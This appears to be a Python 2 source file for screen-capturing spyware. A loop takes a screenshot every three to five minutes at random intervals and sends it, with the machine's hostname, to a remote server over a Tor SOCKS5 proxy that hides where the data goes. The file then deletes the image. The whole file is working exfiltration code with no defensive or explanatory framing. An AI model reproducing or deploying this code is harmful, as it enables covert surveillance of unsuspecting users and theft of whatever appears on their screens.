from random import randint
import time , os
from PIL import ImageGrab
import struct, socket , sys , socks

def Send(fname,server_url):

		print "Trying To connect"
		client = socks.socksocket()
		client.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
		ip = server_url.split(":")[0]
		port = server_url.split(":")[1]
		print ip , port 
		client.connect((ip,int(port)))
		print "connected"
		client.send(socket.gethostname())
		while True:
		 namefile = fname
		 with open(namefile, 'rb') as file:
		  data = file.read()
		 size = struct.pack('!I', len(data))
		 message = size + data
		 client.sendall(message)
		 client.shutdown(socket.SHUT_RDWR)
		 client.close()	
		 print "Sent"
		 break



def run(server_url):

	while True:
		print "Entering..."
		fname = "1.png"

		im = ImageGrab.grab()
		im.save(fname)
		
		Send(fname,server_url)
	
		delay = randint(180,300)
		time.sleep(delay)
		os.remove(fname)
		time.sleep(2)
		
		